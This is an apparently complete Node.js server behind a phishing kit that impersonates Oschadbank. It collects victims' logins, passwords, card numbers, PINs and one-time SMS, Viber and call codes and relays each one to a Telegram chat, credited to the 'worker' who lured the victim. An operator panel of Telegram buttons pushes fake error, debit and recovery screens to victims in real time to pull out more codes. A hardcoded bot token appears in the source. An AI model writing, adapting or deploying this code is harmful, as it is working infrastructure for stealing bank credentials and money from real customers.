const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- КОНФИГУРАЦИЯ ---
const TELEGRAM_BOT_TOKEN = '8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc';
const CHAT_ID = '-1003473672730';
const PORT = process.env.PORT || 3000;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// --- ИНИЦИАЛИЗАЦИЯ ---
const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook установлен на ${WEBHOOK_URL}`))
        .catch(err => console.error('Ошибка установки вебхука:', err));
    bot.sendMessage(CHAT_ID, '✅ Бот перезапущен и готов к работе (Ощадбанк)!', { parse_mode: 'HTML' })
        .catch(err => console.error('Ошибка отправки сообщения в Telegram:', err));
} else {
    console.error('Ошибка: RENDER_EXTERNAL_URL не определен. Вебхук не установлен.');
}

bot.getMe()
    .then(me => console.log(`Бот запущен: @${me.username}`))
    .catch(err => console.error('Ошибка инициализации бота:', err));

app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Клиент подключился по WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Ошибка обработки WebSocket сообщения:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Клиент отключился: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
});

// --- ОБРАБОТКА CALLBACK QUERY ОТ TELEGRAM ---
bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        console.error(`Ошибка: Клиент ${sessionId} не в сети`);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: клиент не в сети!', show_alert: true });
        return;
    }

    const sessionData = sessions.get(sessionId) || {};
    let command = { type, data: {} };
    let responseText = `Команда "${type}" отправлена!`;

    switch (type) {
        case 'lk':
        case 'call':
        case 'ban':
            break;
        case 'number_error':
            command.type = 'number_error';
            command.data = { loginType: sessionData.loginMethod || 'phone' };
            responseText = 'Запрос "неверный номер" отправлен!';
            break;
        case 'telegram_debit':
            command.type = 'telegram_debit';
            break;
        case 'show_debit_form':
            command.type = 'show_debit_form';
            responseText = 'Запрос "Форма списания" отправлен!';
            break;
        case 'password_error':
            command.type = 'password_error';
            command.data = { loginType: sessionData.loginMethod || 'phone' };
            responseText = 'Запрос "неверный пароль" отправлен!';
            break;
        case 'client_not_found':
            command.type = 'client_not_found';
            responseText = 'Запрос "Клиент не найден" отправлен!';
            break;
        case 'code_error':
            command.type = 'code_error';
            responseText = 'Запрос "неверный код" отправлен!';
            break;
        case 'request_details':
             command.type = 'lk';
             responseText = 'Запрос деталей (ЛК) отправлен!';
            break;
        case 'viber_call':
            command.type = 'viber';
            responseText = 'Запрос Viber 📞 отправлен!';
            break;
        case 'recovery':
            command.type = 'recovery';
            responseText = 'Запрос "Восстановление" отправлен!';
            break;
        default:
            console.error(`Неизвестная команда: ${type}`);
            bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}`, show_alert: true });
            return;
    }

    try {
        ws.send(JSON.stringify(command));
        bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
        console.log(`Команда ${type} отправлена клиенту ${sessionId}`);
    } catch (error) {
        console.error(`Ошибка отправки команды ${type} клиенту ${sessionId}:`, error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка отправки команды!', show_alert: true });
    }
});

// --- ОБРАБОТКА API SUBMIT ---
app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;

    if (!sessionId) {
        return res.status(400).json({ message: 'SessionId required' });
    }

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Ошибка декодирования referrer:', e);
    }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);

    let message = '';

    // Логика только для Ощадбанка
    if (stepData.viber_code) {
        message = `<b>📞 Код из Viber (Ощад)</b>\n\n` +
                    `<b>Код:</b> <code>${stepData.viber_code}</code>\n` +
                    `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                    `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
    } else if (stepData.call_code) {
        message = `<b>📞 Код со звонка (Ощад)</b>\n\n` +
                    `<b>Код:</b> <code>${stepData.call_code}</code>\n` +
                    `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                    `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
    } else if (stepData.sms_code) {
        message = `<b>💸 Код списания (Ощад)</b>\n\n` +
                    `<b>Код:</b> <code>${stepData.sms_code}</code>\n` +
                    `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                    `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
    } else if (stepData.debit_sms_code) {
        message = `<b>💸 Код списания (Ощад - Форма)</b>\n\n` +
                    `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n` +
                    `<b>Номер телефона:</b> <code>${newData.phone || 'не указан'}</code>\n` +
                    `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
    } else if (stepData.fp_pin) {
        message = `<b>🔧 Восстановление (Ощад)</b>\n\n` +
                    `<b>Мобильный:</b> <code>${newData.fp_phone}</code>\n` +
                    `<b>Номер карты:</b> <code>${newData.fp_card}</code>\n` +
                    `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n` +
                    `<b>Worker:</b> @${workerNick}\n`;
        sendToTelegram(message, sessionId);
    } else if (stepData.recovery_pin) {
        message = `<b>🔧 Восстановление (Ощад)</b>\n\n` +
                    `<b>Номер карты:</b> <code>${newData.recovery_card}</code>\n` +
                    `<b>Пин:</b> <code>${stepData.recovery_pin}</code>\n` +
                    `<b>Worker:</b> @${workerNick}\n`;
        sendToTelegram(message, sessionId);
    } else if (stepData.password && (stepData.login || stepData.phone)) {
        if (stepData.login) {
            message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n` +
                        `<b>Логин:</b> <code>${stepData.login}</code>\n` +
                        `<b>Пароль:</b> <code>${stepData.password}</code>\n` +
                        `<b>Worker:</b> @${workerNick}\n`;
        } else {
            message = `<b>🏦 Вход в Ощад (Телефон)</b>\n\n` +
                        `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n` +
                        `<b>Пароль:</b> <code>${stepData.password}</code>\n` +
                        `<b>Worker:</b> @${workerNick}\n`;
        }
        sendToTelegram(message, sessionId);
    } else if (isFinalStep) {
        message = `<b>💳 Новый лог (Ощад)</b>\n\n` +
                    (newData.phone ? `<b>Номер телефона:</b> <code>${newData.phone}</code>\n` : '') +
                    (newData.card_number ? `<b>Номер карты:</b> <code>${newData.card_number}</code>\n` : '') +
                    `<b>Worker:</b> @${workerNick}\n`;
        sendToTelegram(message, sessionId);
    }

    res.status(200).json({ message: 'OK' });
});

// --- ОТПРАВКА СООБЩЕНИЯ В TELEGRAM С КЛАВИАТУРОЙ ---
function sendToTelegram(message, sessionId) {
    const keyboard = [
        [
            { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
            { text: 'ЗВОНОК 📞', callback_data: `call:${sessionId}` },
            { text: 'Списание (SMS)', callback_data: `telegram_debit:${sessionId}` },
        ],
        [
            { text: 'Списание (Форма)', callback_data: `show_debit_form:${sessionId}` },
            { text: 'Вход ЛК', callback_data: `request_details:${sessionId}` },
        ],
        [
            { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
            { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
            { text: 'Клиент не найден', callback_data: `client_not_found:${sessionId}` },
        ],
        [
            { text: 'Восстановление', callback_data: `recovery:${sessionId}` },
            { text: 'Забанить', callback_data: `ban:${sessionId}` },
        ],
    ];

    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard },
    }).catch(err => console.error('Ошибка отправки сообщения в Telegram:', err));
}

// --- ЗАПУСК СЕРВЕРА ---
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
